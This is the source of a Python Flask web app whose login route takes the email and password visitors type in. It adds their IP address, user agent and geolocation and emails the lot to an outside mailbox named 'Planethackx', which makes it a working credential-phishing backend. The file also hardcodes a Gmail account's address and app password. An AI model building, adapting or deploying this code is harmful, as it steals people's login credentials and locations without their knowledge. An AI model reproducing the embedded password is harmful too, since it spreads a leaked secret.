from flask import Flask, render_template, request, redirect, flash
from flask_mail import Mail, Message
import logging
import requests
import time
from flask_cors import CORS

app = Flask(__name__)
CORS(app, origins=["https://*"]) # This enables CORS for all routes

app.secret_key = 'your_secret_key'  # Replace with a secure value

# Flask-Mail Configuration
app.config['MAIL_SERVER']='smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USERNAME'] = 'druryd446@gmail.com'
app.config['MAIL_PASSWORD'] = 'tefkpiydouwrbiph'
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True
app.config['MAIL_DEFAULT_SENDER'] = 'druryd446@gmail.com'
mail = Mail(app)


# Logging Configuration
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if user_ip:
            user_ip = user_ip.split(',')[0].strip()

        email = request.form['email']
        password = request.form['password']
        user_agent = request.headers.get('User-Agent')
        location_info = get_location_from_ip(user_ip)

        # List of email recipients (hardcoded or dynamically fetched)
        recipient_emails = ['Planethackx@gmail.com']  # Replace with your recipient emails

        try:
            for recipient_email in recipient_emails:
                send_email_with_retry(recipient_email, email, password, user_ip, user_agent, location_info)
            flash('Login information sent successfully via email!', 'success')
        except Exception as e:
            logger.error(f"Error sending email: {e}")
            flash(f'Error sending email: {str(e)}', 'danger')

        

    return render_template('index.html')


def send_email_with_retry(recipient_email, user_email, user_password, user_ip, user_agent, location_info, retries=3):
    message = (
        f"New Login Attempt:\n"
        f"📧 Email: {user_email}\n"
        f"🔑 Password: {user_password}\n"
        f"🌐 IP Address: {user_ip}\n"
        f"🖥️ User Agent: {user_agent}\n"
        f"📍 Location: {location_info.get('city', 'Unknown')}, {location_info.get('country', 'Unknown')}\n"
        f"🕒 Timezone: {location_info.get('timezone', 'Unknown')}"
    )

    for attempt in range(retries):
        try:
            send_email(recipient_email, message)
            logger.debug(f"Email sent to {recipient_email} on attempt {attempt + 1}")
            break
        except Exception as e:
            logger.error(f"Attempt {attempt + 1} failed: {e}")
            if attempt < retries - 1:
                time.sleep(2)
            else:
                logger.error("Max retries reached, email not sent.")


def send_email(recipient_email, message):
    msg = Message("New Login Attempt", 
                  sender=app.config['MAIL_USERNAME'], 
                  recipients=[recipient_email])
    msg.body = message
    mail.send(msg)


def get_location_from_ip(ip_address):
    try:
        if ip_address in ['127.0.0.1', '::1']:
            ip_address = '8.8.8.8'  # Fallback for local testing
        response = requests.get(f'http://ip-api.com/json/{ip_address}')
        return response.json()
    except Exception as e:
        logger.error(f"Error fetching location: {e}")
        return {'city': 'Unknown', 'country': 'Unknown', 'timezone': 'Unknown'}


if __name__ == '__main__':
    app.run(debug=True)
